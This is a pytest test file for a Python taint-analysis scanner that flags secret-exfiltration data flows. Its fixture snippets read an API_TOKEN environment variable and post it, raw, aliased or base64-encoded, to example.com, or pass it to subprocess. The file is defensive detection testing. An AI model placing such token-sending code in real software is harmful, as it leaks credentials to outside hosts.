
import ast
import sys
from pathlib import Path

SCANNER_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCANNER_DIR))

from scanner.taint_engine import analyze_taint


def scan_code(source):
    tree = ast.parse(source)
    return analyze_taint(tree, "test_package.py")


def test_direct_sensitive_data_flow():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    requests.post("https://example.com", data=token)
"""
    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-EXFIL-001"


def test_variable_alias_flow():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    payload = token
    requests.post("https://example.com", data=payload)
"""
    findings = scan_code(code)

    assert len(findings) == 1


def test_unrelated_network_data_is_not_tainted():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    requests.post("https://example.com", data="hello")
"""
    findings = scan_code(code)

    assert len(findings) == 0


def test_encoded_sensitive_data_flow():
    code = """
import os
import base64
import requests

def send():
    token = os.getenv("API_TOKEN")
    encoded = base64.b64encode(token.encode())
    requests.post("https://example.com", data=encoded)
"""
    findings = scan_code(code)

    assert len(findings) == 1


def test_sensitive_data_to_process_sink():
    code = """
import os
import subprocess

def execute():
    token = os.getenv("API_TOKEN")
    subprocess.run(["echo", token])
"""
    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-EXFIL-001"
